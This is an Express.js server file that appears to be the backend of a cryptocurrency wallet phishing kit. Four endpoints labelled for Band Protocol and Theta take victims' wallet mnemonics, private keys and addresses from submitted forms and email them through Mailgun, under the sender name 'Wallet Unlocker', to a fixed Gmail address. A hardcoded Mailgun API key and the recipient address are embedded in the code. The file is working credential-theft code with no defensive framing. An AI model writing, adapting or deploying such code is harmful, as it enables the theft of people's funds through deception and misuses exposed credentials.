const express = require("express");
const bodyParser = require("body-parser");
require("dotenv").config();
const mailgun = require("mailgun-js");
const DOMAIN = "sandbox1cf7afc3e19d4a499eac606cb06ad367.mailgun.org";
const mg = mailgun({
  apiKey: "d9f9a480c557f7916c91c3b30fa482e7-ffefc4e4-66b91c3a",
  domain: DOMAIN,
});

const app = express();
const cors = require("cors");

app.use(bodyParser.json());
app.use(cors());

app.get("/", (req, res) => {
  res.send(`Hello world`);
});

app.post("/mnemonic", (req, res) => {
  const data = {
    from:
      "Wallet Unlocker <postmaster@sandbox1cf7afc3e19d4a499eac606cb06ad367.mailgun.org>",
    to: "aiwinnilomoabosede8@gmail.com",
    subject: "Bandprotocol Mnemonic Form Information",
    text: `Mnemonic: ${req.body.mnemonic}\nAddress: ${req.body.address}`,
  };
  mg.messages().send(data, function (error, body) {
    if (!error) {
      return res
        .status(200)
        .json({ success: true, data: "Information sent successfully", body });
    }
    res.status(433).json({
      success: false,
      message: "Information could not be sent",
      error,
    });
  });
});

app.post("/private", async (req, res) => {
  const data = {
    from:
      "Wallet Unlocker <postmaster@sandbox1cf7afc3e19d4a499eac606cb06ad367.mailgun.org>",
    to: "aiwinnilomoabosede8@gmail.com",
    subject: "Bandprotocol Private Key Form Information",
    text: `Private Key: ${req.body.mnemonic}\nAddress: ${req.body.address}`,
  };
  mg.messages().send(data, function (error, body) {
    if (!error) {
      return res
        .status(200)
        .json({ success: true, data: "Information sent successfully", body });
    }
    res.status(433).json({
      success: false,
      message: "Information could not be sent",
      error,
    });
  });
});

app.post("/theta/mnemonic", (req, res) => {
  const data = {
    from:
      "Wallet Unlocker <postmaster@sandbox1cf7afc3e19d4a499eac606cb06ad367.mailgun.org>",
    to: "aiwinnilomoabosede8@gmail.com",
    subject: "Theta Mnemonic Form Information",
    text: `Mnemonic: ${req.body.mnemonic}\nAddress: ${req.body.address}`,
  };
  mg.messages().send(data, function (error, body) {
    if (!error) {
      return res
        .status(200)
        .json({ success: true, data: "Information sent successfully", body });
    }
    res.status(433).json({
      success: false,
      message: "Information could not be sent",
      error,
    });
  });
});

app.post("/theta/private", async (req, res) => {
  const data = {
    from:
      "Wallet Unlocker <postmaster@sandbox1cf7afc3e19d4a499eac606cb06ad367.mailgun.org>",
    to: "aiwinnilomoabosede8@gmail.com",
    subject: "Theta Private Key Form Information",
    text: `Private Key: ${req.body.mnemonic}\nAddress: ${req.body.address}`,
  };
  mg.messages().send(data, function (error, body) {
    if (!error) {
      return res
        .status(200)
        .json({ success: true, data: "Information sent successfully", body });
    }
    res.status(433).json({
      success: false,
      message: "Information could not be sent",
      error,
    });
  });
});

const PORT = 5000 || process.env.PORT;
app.listen(PORT, () => console.log(`Backend Server running on port ${PORT}`));
